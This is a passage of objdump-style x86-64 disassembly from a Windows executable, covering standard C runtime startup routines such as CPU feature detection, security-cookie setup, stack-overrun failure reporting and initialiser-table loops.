   140008ebd:	44 89 05 90 a1 00 00 	mov    %r8d,0xa190(%rip)        # 0x140013054
   140008ec4:	83 f8 01             	cmp    $0x1,%eax
   140008ec7:	7c 0d                	jl     0x140008ed6
   140008ec9:	b8 07 00 00 00       	mov    $0x7,%eax
   140008ece:	8d 48 fa             	lea    -0x6(%rax),%ecx
   140008ed1:	0f a2                	cpuid
   140008ed3:	44 8b d2             	mov    %edx,%r10d
   140008ed6:	b8 24 00 00 00       	mov    $0x24,%eax
   140008edb:	3b e8                	cmp    %eax,%ebp
   140008edd:	7c 07                	jl     0x140008ee6
   140008edf:	33 c9                	xor    %ecx,%ecx
   140008ee1:	0f a2                	cpuid
   140008ee3:	44 8b db             	mov    %ebx,%r11d
   140008ee6:	48 8b 05 23 9d 00 00 	mov    0x9d23(%rip),%rax        # 0x140012c10
   140008eed:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   140008ef1:	c7 05 1d 9d 00 00 01 	movl   $0x1,0x9d1d(%rip)        # 0x140012c18
   140008ef8:	00 00 00 
   140008efb:	c7 05 17 9d 00 00 02 	movl   $0x2,0x9d17(%rip)        # 0x140012c1c
   140008f02:	00 00 00 
   140008f05:	48 89 05 04 9d 00 00 	mov    %rax,0x9d04(%rip)        # 0x140012c10
   140008f0c:	0f ba e7 14          	bt     $0x14,%edi
   140008f10:	73 1f                	jae    0x140008f31
   140008f12:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   140008f16:	c7 05 f8 9c 00 00 02 	movl   $0x2,0x9cf8(%rip)        # 0x140012c18
   140008f1d:	00 00 00 
   140008f20:	48 89 05 e9 9c 00 00 	mov    %rax,0x9ce9(%rip)        # 0x140012c10
   140008f27:	c7 05 eb 9c 00 00 06 	movl   $0x6,0x9ceb(%rip)        # 0x140012c1c
   140008f2e:	00 00 00 
   140008f31:	0f ba e7 1b          	bt     $0x1b,%edi
   140008f35:	0f 83 33 01 00 00    	jae    0x14000906e
   140008f3b:	33 c9                	xor    %ecx,%ecx
   140008f3d:	0f 01 d0             	xgetbv
   140008f40:	48 c1 e2 20          	shl    $0x20,%rdx
   140008f44:	48 0b d0             	or     %rax,%rdx
   140008f47:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140008f4c:	0f ba e7 1c          	bt     $0x1c,%edi
   140008f50:	0f 83 fc 00 00 00    	jae    0x140009052
   140008f56:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008f5b:	24 06                	and    $0x6,%al
   140008f5d:	3c 06                	cmp    $0x6,%al
   140008f5f:	0f 85 ed 00 00 00    	jne    0x140009052
   140008f65:	8b 05 b1 9c 00 00    	mov    0x9cb1(%rip),%eax        # 0x140012c1c
   140008f6b:	b2 e0                	mov    $0xe0,%dl
   140008f6d:	83 c8 08             	or     $0x8,%eax
   140008f70:	c7 05 9e 9c 00 00 03 	movl   $0x3,0x9c9e(%rip)        # 0x140012c18
   140008f77:	00 00 00 
   140008f7a:	89 05 9c 9c 00 00    	mov    %eax,0x9c9c(%rip)        # 0x140012c1c
   140008f80:	41 f6 c1 20          	test   $0x20,%r9b
   140008f84:	74 62                	je     0x140008fe8
   140008f86:	83 c8 20             	or     $0x20,%eax
   140008f89:	c7 05 85 9c 00 00 05 	movl   $0x5,0x9c85(%rip)        # 0x140012c18
   140008f90:	00 00 00 
   140008f93:	89 05 83 9c 00 00    	mov    %eax,0x9c83(%rip)        # 0x140012c1c
   140008f99:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   140008f9e:	48 8b 05 6b 9c 00 00 	mov    0x9c6b(%rip),%rax        # 0x140012c10
   140008fa5:	44 23 c9             	and    %ecx,%r9d
   140008fa8:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   140008fac:	48 89 05 5d 9c 00 00 	mov    %rax,0x9c5d(%rip)        # 0x140012c10
   140008fb3:	44 3b c9             	cmp    %ecx,%r9d
   140008fb6:	75 37                	jne    0x140008fef
   140008fb8:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140008fbd:	22 c2                	and    %dl,%al
   140008fbf:	3a c2                	cmp    %dl,%al
   140008fc1:	75 25                	jne    0x140008fe8
   140008fc3:	48 8b 05 46 9c 00 00 	mov    0x9c46(%rip),%rax        # 0x140012c10
   140008fca:	83 0d 4b 9c 00 00 40 	orl    $0x40,0x9c4b(%rip)        # 0x140012c1c
   140008fd1:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   140008fd5:	c7 05 39 9c 00 00 06 	movl   $0x6,0x9c39(%rip)        # 0x140012c18
   140008fdc:	00 00 00 
   140008fdf:	48 89 05 2a 9c 00 00 	mov    %rax,0x9c2a(%rip)        # 0x140012c10
   140008fe6:	eb 07                	jmp    0x140008fef
   140008fe8:	48 8b 05 21 9c 00 00 	mov    0x9c21(%rip),%rax        # 0x140012c10
   140008fef:	0f ba e6 17          	bt     $0x17,%esi
   140008ff3:	73 0c                	jae    0x140009001
   140008ff5:	48 0f ba f0 18       	btr    $0x18,%rax
   140008ffa:	48 89 05 0f 9c 00 00 	mov    %rax,0x9c0f(%rip)        # 0x140012c10
   140009001:	41 0f ba e2 13       	bt     $0x13,%r10d
   140009006:	73 4a                	jae    0x140009052
   140009008:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000900d:	22 c2                	and    %dl,%al
   14000900f:	3a c2                	cmp    %dl,%al
   140009011:	75 3f                	jne    0x140009052
   140009013:	41 8b cb             	mov    %r11d,%ecx
   140009016:	41 8b c3             	mov    %r11d,%eax
   140009019:	48 c1 e9 10          	shr    $0x10,%rcx
   14000901d:	25 ff 00 04 00       	and    $0x400ff,%eax
   140009022:	83 e1 06             	and    $0x6,%ecx
   140009025:	89 05 25 a0 00 00    	mov    %eax,0xa025(%rip)        # 0x140013050
   14000902b:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   140009032:	48 f7 d1             	not    %rcx
   140009035:	48 23 0d d4 9b 00 00 	and    0x9bd4(%rip),%rcx        # 0x140012c10
   14000903c:	48 89 0d cd 9b 00 00 	mov    %rcx,0x9bcd(%rip)        # 0x140012c10
   140009043:	3c 01                	cmp    $0x1,%al
   140009045:	76 0b                	jbe    0x140009052
   140009047:	48 83 e1 bf          	and    $0xffffffffffffffbf,%rcx
   14000904b:	48 89 0d be 9b 00 00 	mov    %rcx,0x9bbe(%rip)        # 0x140012c10
   140009052:	41 0f ba e2 15       	bt     $0x15,%r10d
   140009057:	73 15                	jae    0x14000906e
   140009059:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000905e:	48 0f ba e0 13       	bt     $0x13,%rax
   140009063:	73 09                	jae    0x14000906e
   140009065:	48 0f ba 35 a2 9b 00 	btrq   $0x7,0x9ba2(%rip)        # 0x140012c10
   14000906c:	00 07 
   14000906e:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140009073:	33 c0                	xor    %eax,%eax
   140009075:	48 8b 6c 24 30       	mov    0x30(%rsp),%rbp
   14000907a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000907f:	48 83 c4 10          	add    $0x10,%rsp
   140009083:	5f                   	pop    %rdi
   140009084:	c3                   	ret
   140009085:	cc                   	int3
   140009086:	cc                   	int3
   140009087:	cc                   	int3
   140009088:	c2 00 00             	ret    $0x0
   14000908b:	cc                   	int3
   14000908c:	48 8d 05 4d 4d 00 00 	lea    0x4d4d(%rip),%rax        # 0x14000dde0
   140009093:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000909a:	00 
   14000909b:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000909f:	48 8d 05 b2 15 00 00 	lea    0x15b2(%rip),%rax        # 0x14000a658
   1400090a6:	48 89 01             	mov    %rax,(%rcx)
   1400090a9:	48 8b c1             	mov    %rcx,%rax
   1400090ac:	c3                   	ret
   1400090ad:	cc                   	int3
   1400090ae:	cc                   	int3
   1400090af:	cc                   	int3
   1400090b0:	48 83 ec 48          	sub    $0x48,%rsp
   1400090b4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400090b9:	e8 ce ff ff ff       	call   0x14000908c
   1400090be:	48 8d 15 3b 67 00 00 	lea    0x673b(%rip),%rdx        # 0x14000f800
   1400090c5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400090ca:	e8 63 05 00 00       	call   0x140009632
   1400090cf:	cc                   	int3
   1400090d0:	e9 9f 05 00 00       	jmp    0x140009674
   1400090d5:	cc                   	int3
   1400090d6:	cc                   	int3
   1400090d7:	cc                   	int3
   1400090d8:	40 53                	rex push %rbx
   1400090da:	48 83 ec 20          	sub    $0x20,%rsp
   1400090de:	48 8b d9             	mov    %rcx,%rbx
   1400090e1:	33 c9                	xor    %ecx,%ecx
   1400090e3:	ff 15 b7 0f 00 00    	call   *0xfb7(%rip)        # 0x14000a0a0
   1400090e9:	48 8b cb             	mov    %rbx,%rcx
   1400090ec:	ff 15 b6 0f 00 00    	call   *0xfb6(%rip)        # 0x14000a0a8
   1400090f2:	ff 15 10 0f 00 00    	call   *0xf10(%rip)        # 0x14000a008
   1400090f8:	48 8b c8             	mov    %rax,%rcx
   1400090fb:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140009100:	48 83 c4 20          	add    $0x20,%rsp
   140009104:	5b                   	pop    %rbx
   140009105:	48 ff 25 8c 0f 00 00 	rex.W jmp *0xf8c(%rip)        # 0x14000a098
   14000910c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140009111:	48 83 ec 38          	sub    $0x38,%rsp
   140009115:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000911a:	ff 15 70 0f 00 00    	call   *0xf70(%rip)        # 0x14000a090
   140009120:	85 c0                	test   %eax,%eax
   140009122:	74 07                	je     0x14000912b
   140009124:	b9 02 00 00 00       	mov    $0x2,%ecx
   140009129:	cd 29                	int    $0x29
   14000912b:	48 8d 0d ce 9f 00 00 	lea    0x9fce(%rip),%rcx        # 0x140013100
   140009132:	e8 a9 00 00 00       	call   0x1400091e0
   140009137:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   14000913c:	48 89 05 b5 a0 00 00 	mov    %rax,0xa0b5(%rip)        # 0x1400131f8
   140009143:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140009148:	48 83 c0 08          	add    $0x8,%rax
   14000914c:	48 89 05 45 a0 00 00 	mov    %rax,0xa045(%rip)        # 0x140013198
   140009153:	48 8b 05 9e a0 00 00 	mov    0xa09e(%rip),%rax        # 0x1400131f8
   14000915a:	48 89 05 0f 9f 00 00 	mov    %rax,0x9f0f(%rip)        # 0x140013070
   140009161:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140009166:	48 89 05 13 a0 00 00 	mov    %rax,0xa013(%rip)        # 0x140013180
   14000916d:	c7 05 e9 9e 00 00 09 	movl   $0xc0000409,0x9ee9(%rip)        # 0x140013060
   140009174:	04 00 c0 
   140009177:	c7 05 e3 9e 00 00 01 	movl   $0x1,0x9ee3(%rip)        # 0x140013064
   14000917e:	00 00 00 
   140009181:	c7 05 ed 9e 00 00 01 	movl   $0x1,0x9eed(%rip)        # 0x140013078
   140009188:	00 00 00 
   14000918b:	b8 08 00 00 00       	mov    $0x8,%eax
   140009190:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140009194:	48 8d 0d e5 9e 00 00 	lea    0x9ee5(%rip),%rcx        # 0x140013080
   14000919b:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400091a2:	00 
   1400091a3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400091a8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400091ac:	48 8b 0d 0d 9a 00 00 	mov    0x9a0d(%rip),%rcx        # 0x140012bc0
   1400091b3:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400091b8:	b8 08 00 00 00       	mov    $0x8,%eax
   1400091bd:	48 6b c0 01          	imul   $0x1,%rax,%rax
   1400091c1:	48 8b 0d 38 9a 00 00 	mov    0x9a38(%rip),%rcx        # 0x140012c00
   1400091c8:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1400091cd:	48 8d 0d 1c 4c 00 00 	lea    0x4c1c(%rip),%rcx        # 0x14000ddf0
   1400091d4:	e8 ff fe ff ff       	call   0x1400090d8
   1400091d9:	90                   	nop
   1400091da:	48 83 c4 38          	add    $0x38,%rsp
   1400091de:	c3                   	ret
   1400091df:	cc                   	int3
   1400091e0:	40 53                	rex push %rbx
   1400091e2:	56                   	push   %rsi
   1400091e3:	57                   	push   %rdi
   1400091e4:	48 83 ec 40          	sub    $0x40,%rsp
   1400091e8:	48 8b d9             	mov    %rcx,%rbx
   1400091eb:	ff 15 cf 0e 00 00    	call   *0xecf(%rip)        # 0x14000a0c0
   1400091f1:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   1400091f8:	33 ff                	xor    %edi,%edi
   1400091fa:	45 33 c0             	xor    %r8d,%r8d
   1400091fd:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140009202:	48 8b ce             	mov    %rsi,%rcx
   140009205:	ff 15 ad 0e 00 00    	call   *0xead(%rip)        # 0x14000a0b8
   14000920b:	48 85 c0             	test   %rax,%rax
   14000920e:	74 3c                	je     0x14000924c
   140009210:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140009215:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000921a:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140009221:	00 00 
   140009223:	4c 8b c8             	mov    %rax,%r9
   140009226:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   14000922b:	4c 8b c6             	mov    %rsi,%r8
   14000922e:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140009233:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140009238:	33 c9                	xor    %ecx,%ecx
   14000923a:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000923f:	ff 15 6b 0e 00 00    	call   *0xe6b(%rip)        # 0x14000a0b0
   140009245:	ff c7                	inc    %edi
   140009247:	83 ff 02             	cmp    $0x2,%edi
   14000924a:	7c ae                	jl     0x1400091fa
   14000924c:	48 83 c4 40          	add    $0x40,%rsp
   140009250:	5f                   	pop    %rdi
   140009251:	5e                   	pop    %rsi
   140009252:	5b                   	pop    %rbx
   140009253:	c3                   	ret
   140009254:	b8 01 00 00 00       	mov    $0x1,%eax
   140009259:	c3                   	ret
   14000925a:	cc                   	int3
   14000925b:	cc                   	int3
   14000925c:	33 c0                	xor    %eax,%eax
   14000925e:	39 05 dc 99 00 00    	cmp    %eax,0x99dc(%rip)        # 0x140012c40
   140009264:	0f 95 c0             	setne  %al
   140009267:	c3                   	ret
   140009268:	c7 05 5e a3 00 00 00 	movl   $0x0,0xa35e(%rip)        # 0x1400135d0
   14000926f:	00 00 00 
   140009272:	c3                   	ret
   140009273:	cc                   	int3
   140009274:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009279:	55                   	push   %rbp
   14000927a:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140009281:	ff 
   140009282:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140009289:	8b d9                	mov    %ecx,%ebx
   14000928b:	b9 17 00 00 00       	mov    $0x17,%ecx
   140009290:	ff 15 fa 0d 00 00    	call   *0xdfa(%rip)        # 0x14000a090
   140009296:	85 c0                	test   %eax,%eax
   140009298:	74 04                	je     0x14000929e
   14000929a:	8b cb                	mov    %ebx,%ecx
   14000929c:	cd 29                	int    $0x29
   14000929e:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400092a3:	e8 c0 ff ff ff       	call   0x140009268
   1400092a8:	33 d2                	xor    %edx,%edx
   1400092aa:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400092ae:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   1400092b4:	e8 97 03 00 00       	call   0x140009650
   1400092b9:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400092bd:	ff 15 fd 0d 00 00    	call   *0xdfd(%rip)        # 0x14000a0c0
   1400092c3:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   1400092ca:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   1400092d1:	48 8b cb             	mov    %rbx,%rcx
   1400092d4:	45 33 c0             	xor    %r8d,%r8d
   1400092d7:	ff 15 db 0d 00 00    	call   *0xddb(%rip)        # 0x14000a0b8
   1400092dd:	48 85 c0             	test   %rax,%rax
   1400092e0:	74 3f                	je     0x140009321
   1400092e2:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   1400092e9:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   1400092f0:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   1400092f7:	00 00 
   1400092f9:	4c 8b c8             	mov    %rax,%r9
   1400092fc:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140009301:	4c 8b c3             	mov    %rbx,%r8
   140009304:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   14000930b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140009310:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140009314:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140009319:	33 c9                	xor    %ecx,%ecx
   14000931b:	ff 15 8f 0d 00 00    	call   *0xd8f(%rip)        # 0x14000a0b0
   140009321:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140009328:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000932d:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   140009334:	33 d2                	xor    %edx,%edx
   140009336:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   14000933d:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   140009343:	48 83 c0 08          	add    $0x8,%rax
   140009347:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   14000934e:	e8 fd 02 00 00       	call   0x140009650
   140009353:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   14000935a:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000935f:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   140009366:	40 
   140009367:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   14000936e:	00 
   14000936f:	ff 15 13 0d 00 00    	call   *0xd13(%rip)        # 0x14000a088
   140009375:	8b d8                	mov    %eax,%ebx
   140009377:	33 c9                	xor    %ecx,%ecx
   140009379:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000937e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140009383:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140009387:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000938c:	ff 15 0e 0d 00 00    	call   *0xd0e(%rip)        # 0x14000a0a0
   140009392:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140009397:	ff 15 0b 0d 00 00    	call   *0xd0b(%rip)        # 0x14000a0a8
   14000939d:	85 c0                	test   %eax,%eax
   14000939f:	75 0d                	jne    0x1400093ae
   1400093a1:	83 fb 01             	cmp    $0x1,%ebx
   1400093a4:	74 08                	je     0x1400093ae
   1400093a6:	8d 48 03             	lea    0x3(%rax),%ecx
   1400093a9:	e8 ba fe ff ff       	call   0x140009268
   1400093ae:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   1400093b5:	00 
   1400093b6:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   1400093bd:	5d                   	pop    %rbp
   1400093be:	c3                   	ret
   1400093bf:	cc                   	int3
   1400093c0:	e9 03 00 00 00       	jmp    0x1400093c8
   1400093c5:	cc                   	int3
   1400093c6:	cc                   	int3
   1400093c7:	cc                   	int3
   1400093c8:	33 c0                	xor    %eax,%eax
   1400093ca:	c3                   	ret
   1400093cb:	cc                   	int3
   1400093cc:	48 83 ec 28          	sub    $0x28,%rsp
   1400093d0:	33 c9                	xor    %ecx,%ecx
   1400093d2:	ff 15 a8 0c 00 00    	call   *0xca8(%rip)        # 0x14000a080
   1400093d8:	48 85 c0             	test   %rax,%rax
   1400093db:	74 3a                	je     0x140009417
   1400093dd:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   1400093e2:	66 39 08             	cmp    %cx,(%rax)
   1400093e5:	75 30                	jne    0x140009417
   1400093e7:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400093eb:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   1400093f2:	75 23                	jne    0x140009417
   1400093f4:	ba 0b 02 00 00       	mov    $0x20b,%edx
   1400093f9:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   1400093fe:	75 17                	jne    0x140009417
   140009400:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   140009407:	0e 
   140009408:	76 0d                	jbe    0x140009417
   14000940a:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   140009411:	00 
   140009412:	0f 95 c0             	setne  %al
   140009415:	eb 02                	jmp    0x140009419
   140009417:	32 c0                	xor    %al,%al
   140009419:	48 83 c4 28          	add    $0x28,%rsp
   14000941d:	c3                   	ret
   14000941e:	cc                   	int3
   14000941f:	cc                   	int3
   140009420:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140009430
   140009427:	48 ff 25 72 0c 00 00 	rex.W jmp *0xc72(%rip)        # 0x14000a0a0
   14000942e:	cc                   	int3
   14000942f:	cc                   	int3
   140009430:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009435:	57                   	push   %rdi
   140009436:	48 83 ec 20          	sub    $0x20,%rsp
   14000943a:	48 8b 19             	mov    (%rcx),%rbx
   14000943d:	48 8b f9             	mov    %rcx,%rdi
   140009440:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140009446:	75 24                	jne    0x14000946c
   140009448:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000944c:	75 1e                	jne    0x14000946c
   14000944e:	8b 53 20             	mov    0x20(%rbx),%edx
   140009451:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   140009457:	74 20                	je     0x140009479
   140009459:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   14000945f:	83 f8 01             	cmp    $0x1,%eax
   140009462:	76 15                	jbe    0x140009479
   140009464:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   14000946a:	74 0d                	je     0x140009479
   14000946c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009471:	33 c0                	xor    %eax,%eax
   140009473:	48 83 c4 20          	add    $0x20,%rsp
   140009477:	5f                   	pop    %rdi
   140009478:	c3                   	ret
   140009479:	e8 de 01 00 00       	call   0x14000965c
   14000947e:	48 89 18             	mov    %rbx,(%rax)
   140009481:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140009485:	e8 d8 01 00 00       	call   0x140009662
   14000948a:	48 89 18             	mov    %rbx,(%rax)
   14000948d:	e8 78 02 00 00       	call   0x14000970a
   140009492:	cc                   	int3
   140009493:	cc                   	int3
   140009494:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140009499:	55                   	push   %rbp
   14000949a:	48 8b ec             	mov    %rsp,%rbp
   14000949d:	48 83 ec 30          	sub    $0x30,%rsp
   1400094a1:	48 8b 05 18 97 00 00 	mov    0x9718(%rip),%rax        # 0x140012bc0
   1400094a8:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1400094af:	2b 00 00 
   1400094b2:	48 3b c3             	cmp    %rbx,%rax
   1400094b5:	75 77                	jne    0x14000952e
   1400094b7:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1400094bb:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   1400094c2:	00 
   1400094c3:	ff 15 9f 0b 00 00    	call   *0xb9f(%rip)        # 0x14000a068
   1400094c9:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400094cd:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400094d1:	ff 15 99 0b 00 00    	call   *0xb99(%rip)        # 0x14000a070
   1400094d7:	8b c0                	mov    %eax,%eax
   1400094d9:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400094dd:	ff 15 2d 0b 00 00    	call   *0xb2d(%rip)        # 0x14000a010
   1400094e3:	8b c0                	mov    %eax,%eax
   1400094e5:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1400094e9:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1400094ed:	ff 15 85 0b 00 00    	call   *0xb85(%rip)        # 0x14000a078
   1400094f3:	8b 45 18             	mov    0x18(%rbp),%eax
   1400094f6:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400094fa:	48 c1 e0 20          	shl    $0x20,%rax
   1400094fe:	48 33 45 18          	xor    0x18(%rbp),%rax
   140009502:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   140009506:	48 33 c1             	xor    %rcx,%rax
   140009509:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140009510:	ff 00 00 
   140009513:	48 23 c1             	and    %rcx,%rax
   140009516:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   14000951d:	2b 00 00 
   140009520:	48 3b c3             	cmp    %rbx,%rax
   140009523:	48 0f 44 c1          	cmove  %rcx,%rax
   140009527:	48 89 05 92 96 00 00 	mov    %rax,0x9692(%rip)        # 0x140012bc0
   14000952e:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140009533:	48 f7 d0             	not    %rax
   140009536:	48 89 05 c3 96 00 00 	mov    %rax,0x96c3(%rip)        # 0x140012c00
   14000953d:	48 83 c4 30          	add    $0x30,%rsp
   140009541:	5d                   	pop    %rbp
   140009542:	c3                   	ret
   140009543:	cc                   	int3
   140009544:	b8 00 40 00 00       	mov    $0x4000,%eax
   140009549:	c3                   	ret
   14000954a:	cc                   	int3
   14000954b:	cc                   	int3
   14000954c:	48 8d 0d 8d a0 00 00 	lea    0xa08d(%rip),%rcx        # 0x1400135e0
   140009553:	48 ff 25 6e 0b 00 00 	rex.W jmp *0xb6e(%rip)        # 0x14000a0c8
   14000955a:	cc                   	int3
   14000955b:	cc                   	int3
   14000955c:	b0 01                	mov    $0x1,%al
   14000955e:	c3                   	ret
   14000955f:	cc                   	int3
   140009560:	48 8d 05 89 a0 00 00 	lea    0xa089(%rip),%rax        # 0x1400135f0
   140009567:	c3                   	ret
   140009568:	48 83 ec 28          	sub    $0x28,%rsp
   14000956c:	e8 3f b9 ff ff       	call   0x140004eb0
   140009571:	48 83 08 24          	orq    $0x24,(%rax)
   140009575:	e8 e6 ff ff ff       	call   0x140009560
   14000957a:	48 83 08 02          	orq    $0x2,(%rax)
   14000957e:	48 83 c4 28          	add    $0x28,%rsp
   140009582:	c3                   	ret
   140009583:	cc                   	int3
   140009584:	33 c0                	xor    %eax,%eax
   140009586:	39 05 a8 96 00 00    	cmp    %eax,0x96a8(%rip)        # 0x140012c34
   14000958c:	0f 94 c0             	sete   %al
   14000958f:	c3                   	ret
   140009590:	48 8d 05 69 a0 00 00 	lea    0xa069(%rip),%rax        # 0x140013600
   140009597:	c3                   	ret
   140009598:	48 8d 05 59 a0 00 00 	lea    0xa059(%rip),%rax        # 0x1400135f8
   14000959f:	c3                   	ret
   1400095a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400095a5:	57                   	push   %rdi
   1400095a6:	48 83 ec 20          	sub    $0x20,%rsp
   1400095aa:	48 8d 1d 77 54 00 00 	lea    0x5477(%rip),%rbx        # 0x14000ea28
   1400095b1:	48 8d 3d 70 54 00 00 	lea    0x5470(%rip),%rdi        # 0x14000ea28
   1400095b8:	eb 12                	jmp    0x1400095cc
   1400095ba:	48 8b 03             	mov    (%rbx),%rax
   1400095bd:	48 85 c0             	test   %rax,%rax
   1400095c0:	74 06                	je     0x1400095c8
   1400095c2:	ff 15 a8 0f 00 00    	call   *0xfa8(%rip)        # 0x14000a570
   1400095c8:	48 83 c3 08          	add    $0x8,%rbx
   1400095cc:	48 3b df             	cmp    %rdi,%rbx
   1400095cf:	72 e9                	jb     0x1400095ba
   1400095d1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400095d6:	48 83 c4 20          	add    $0x20,%rsp
   1400095da:	5f                   	pop    %rdi
   1400095db:	c3                   	ret
   1400095dc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400095e1:	57                   	push   %rdi
   1400095e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400095e6:	48 8d 1d 4b 54 00 00 	lea    0x544b(%rip),%rbx        # 0x14000ea38
   1400095ed:	48 8d 3d 44 54 00 00 	lea    0x5444(%rip),%rdi        # 0x14000ea38
   1400095f4:	eb 12                	jmp    0x140009608
   1400095f6:	48 8b 03             	mov    (%rbx),%rax
   1400095f9:	48 85 c0             	test   %rax,%rax
   1400095fc:	74 06                	je     0x140009604
   1400095fe:	ff 15 6c 0f 00 00    	call   *0xf6c(%rip)        # 0x14000a570
   140009604:	48 83 c3 08          	add    $0x8,%rbx
   140009608:	48 3b df             	cmp    %rdi,%rbx
   14000960b:	72 e9                	jb     0x1400095f6
   14000960d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009612:	48 83 c4 20          	add    $0x20,%rsp
